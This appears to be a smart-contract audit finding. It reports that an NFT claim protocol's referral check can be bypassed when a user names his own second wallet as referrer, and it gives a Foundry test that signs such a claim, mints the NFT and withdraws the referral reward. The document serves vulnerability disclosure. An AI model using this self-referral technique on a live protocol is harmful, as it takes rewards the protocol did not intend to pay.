# Vulnerability details

## Impact
The protocol supports referrals which can get rewards when the user claims an NFT with them. 
There is a check for users to set them as a referral directly, but the user setting his other address as a referral cannot be stopped. 
This gives him a chance to claim the NFT with a discount

Users can claim NFTs with a discount

## Proof of Concept
Paste this test inside `Claimable.t.sol`

```javascript
function test_claim_1155_with_self_ref() public {
    vm.warp(START_TIME + 1);
    address artAddress = phiFactory.getArtAddress(1);
    vm.warp(START_TIME + 2);

    uint256 tokenId = 1;
    uint256 quantity = 1;

    address participantSecondWallet = makeAddr("participantSecondWallet");

    /* Set other address as a referrer */
    bytes memory signData =
        abi.encode(expiresIn, participant, participantSecondWallet, verifier, 1, block.chainid, bytes32("1"));
    bytes32 msgHash = keccak256(signData);
    bytes32 digest = ECDSA.toEthSignedMessageHash(msgHash);

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(claimSignerPrivateKey, digest);
    if (v != 27) s = s | bytes32(uint256(1) << 255);
    bytes memory data = abi.encode(
        r,
        s,
        participantSecondWallet,
        verifier,
        participant,
        tokenId,
        quantity,
        expiresIn,
        "ART_ID_URL_STRING",
        bytes32("1")
    );

    /* Claim */
    bytes memory payload = abi.encodePacked(abi.encodeWithSignature("signatureClaim()"), data);
    vm.startPrank(participant, participant);
    (bool success,) = artAddress.call{ value: phiFactory.getArtMintFee(1, 1) }(payload);
    require(success, "1155 artAddress.call failed");

    assertEq(IERC1155(artAddress).balanceOf(participant, 1), 1, "particpiant erc1155 balance");

    /* Claim the referral reward with his other wallet */
    assertEq(participantSecondWallet.balance, 0, "referal fee");
    phiRewards.withdrawFor(participantSecondWallet, REFERRAL_REWARD);
    assertEq(participantSecondWallet.balance, REFERRAL_REWARD, "verify fee");
}
```
